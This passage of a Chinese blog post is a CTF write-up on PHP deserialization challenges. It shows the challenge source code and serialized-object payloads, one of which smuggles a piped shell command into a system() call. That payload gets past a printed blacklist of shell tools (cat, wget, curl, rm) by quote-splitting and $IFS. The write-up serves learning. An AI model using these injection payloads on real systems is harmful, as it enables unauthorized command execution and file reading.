+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hint.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> (<span class="string">&quot;good&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>index.php</strong>传入两个参数，一个是<strong>file</strong>，一个是<strong>password</strong>，再看<strong>hint.php</strong>，构造了一个类，其中的**__tostring()<strong>这个方法在</strong>index.php<strong>的</strong>echo
+<span
+class="math inline">\(password;**时会被调用，那么解题思路就是对**file**传参**hint.php**，使**index.php**达成**include(hint.php);**这一个指令，然后**password**传入一个**\)</span>file<strong>成员变量，使得</strong>__tostring()<strong>方法中的</strong>file_get_contents(<span
+class="math inline">\(this-&gt;file);**指令可以读取**\)</span>file<strong>成员变量所传入的文件名。而此处的文件名明显是</strong>flag.php**了</p>
+<p>构造的类如下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">  </span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();  </span><br><span class="line">    <span class="variable">$a</span>-&gt;file = <span class="string">&quot;flag.php&quot;</span>;  </span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);  </span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
+<p>最终<strong>Payload</strong>如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="php">PHP</h3>
+<p><strong>.git</strong>源码泄漏就不多说了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php部分代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;waf.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$tips</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;tips&#x27;</span>];</span><br><span class="line"><span class="variable">$tip</span>  = @<span class="variable">$_GET</span>[<span class="string">&#x27;tip&#x27;</span>];</span><br><span class="line"><span class="comment">// echo $tips;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$tip</span>)&amp;&amp;(@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tip</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;you got this&quot;</span>))&#123;</span><br><span class="line"><span class="comment">// echo 123;</span></span><br><span class="line">	@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$tips</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>包含了<strong>class.php</strong>和<strong>waf.php</strong>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Blog</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;passage&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$black</span> = [];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$black</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$value</span>))&#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">&quot;Attack!&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		 &#125;</span><br><span class="line">		<span class="comment">//echo &quot;\n&quot;.$this-&gt;page;</span></span><br><span class="line">		<span class="title function_ invoke__">system</span>(<span class="string">&quot;php ./templates/<span class="subst">$this</span>-&gt;file.php&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> =<span class="keyword">new</span> <span class="title class_">Blog</span>();</span><br><span class="line"><span class="comment">//echo serialize($b);</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看出<strong>Blog</strong>类中有一个**__destruct()<strong>方法，起作用是当一个对象销毁时调用</strong>system<strong>这个指令，而在最后有一句</strong>unset(<span
+class="math inline">\(b)**的销毁对象指令，且可控的部分只有**\)</span>this-&gt;file<strong>，后面被</strong>.php<strong>给闭合，故此需要使用</strong>|<strong>管道符来进行操作，其作用于此做个笔记，就是把左边命令的输出数据作为右边命令的输入数据，先执行左边的命令，再执行右边的命令，类似的操作比如在</strong>Linux<strong>下寻找对应的软件包</strong>rpm
+-qa|grep
+nginx<strong>，先列出所有的软件包，然后寻找</strong>Nginx**。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// waf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$values</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$black</span> = [];</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$black</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$values</span>,<span class="variable">$value</span>))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;Attack!&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>并没有过滤什么，那么大致构造的<strong>Payload</strong>如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?tip=php://input&amp;tips=O:4:&quot;Blog&quot;:1:&#123;s:4:&quot;file&quot;;s:30:&quot;Flag.php|cat ../templates/Flag&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>并没有成功，<strong>git</strong>查看历史版本的<strong>waf</strong>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$values</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$black</span> = [<span class="string">&#x27;rev&#x27;</span>,<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>,<span class="string">&#x27;mv&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;tailf&#x27;</span>,<span class="string">&#x27;nl&#x27;</span>,<span class="string">&#x27;less&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;$IFS$9&#x27;</span>,<span class="string">&#x27;od&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;head&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;tac&#x27;</span>,<span class="string">&#x27;rm&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;tailf&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;%0a&#x27;</span>,<span class="string">&#x27;%0d&#x27;</span>,<span class="string">&#x27;%00&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;ps&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;$&#123;IFS&#125;&#x27;</span>,<span class="string">&#x27;ifconfig&#x27;</span>,<span class="string">&#x27;mkdir&#x27;</span>,<span class="string">&#x27;cp&#x27;</span>,<span class="string">&#x27;chmod&#x27;</span>,<span class="string">&#x27;wget&#x27;</span>,<span class="string">&#x27;curl&#x27;</span>,<span class="string">&#x27;http&#x27;</span>,<span class="string">&#x27;www&#x27;</span>,<span class="string">&#x27;**&#x27;</span>,<span class="string">&#x27;printf&#x27;</span>,<span class="string">&#x27;awk&#x27;</span>];</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$black</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$values</span>,<span class="variable">$value</span>))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;Attack!&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>于是最终<strong>Payload</strong>如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?tip=php://input&amp;tips=O:4:&quot;Blog&quot;:1:&#123;s:4:&quot;file&quot;;s:34:&quot;Flag.php|ca&#x27;&#x27;t$IFS./templates/Flag&quot;;&#125; </span><br></pre></td></tr></table></figure>
+<h1 id="refer">Refer</h1>
+<p><a target="_blank" rel="noopener" href="http://www.she1don.cn/index.php/archives/15.html">php
+反序列化入门</a></p>
+<p><a
+target="_blank" rel="noopener" href="http://www.lmxspace.com/2018/05/03/php-unserialize-%E5%88%9D%E8%AF%86/">php-unserialize-初识</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2467">[红日安全]代码审计Day4 -
+strpos使用不当引发漏洞</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+              <a href="/tags/PHP/" rel="tag"><i class="fa fa-tag"></i> PHP</a>
+              <a href="/tags/Unserialize/" rel="tag"><i class="fa fa-tag"></i> Unserialize</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2018-AH-Provincial-Competition/" rel="prev" title="2018 全国大学生软件测试大赛 安恒杯Web测试大赛 省赛 部分题解">
+                  <i class="fa fa-chevron-left"></i> 2018 全国大学生软件测试大赛 安恒杯Web测试大赛 省赛 部分题解
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Study-Unserialize-PHP-Bypass/" rel="next" title="关于反序列化漏洞的初探">
+                  关于反序列化漏洞的初探 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    
+  <div class="comments disqusjs-container">
+    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+  </div>
+  
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+  <script src="/live2d-widget/autoload.js"></script>
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">南溟NaN</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/disqusjs/3.0.2/styles/disqusjs.css" integrity="sha256-71XarXwNr1Td27HmZI9zjY+rMzRdush6/glo6VFXp7o=" crossorigin="anonymous">
+
+<script class="next-config" data-name="disqusjs" type="application/json">{"enable":true,"api":"https://disqus.skk.moe/disqus/","apikey":"Cz7uQCDoGwWYGv80HeDq40mZr1rrmYy9tHhCpcWG95DFzOD1TJKLXtbTxFqWBCr5","shortname":"southseast","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/disqusjs/3.0.2/disqusjs.es2015.umd.min.js","integrity":"sha256-okP99ZQKVpIy7+NogAMpGlIQzJa9XKXhIJcFgdju5bU="}}</script>
+<script src="/js/third-party/comments/disqusjs.js"></script>
+
+</body>
+</html>
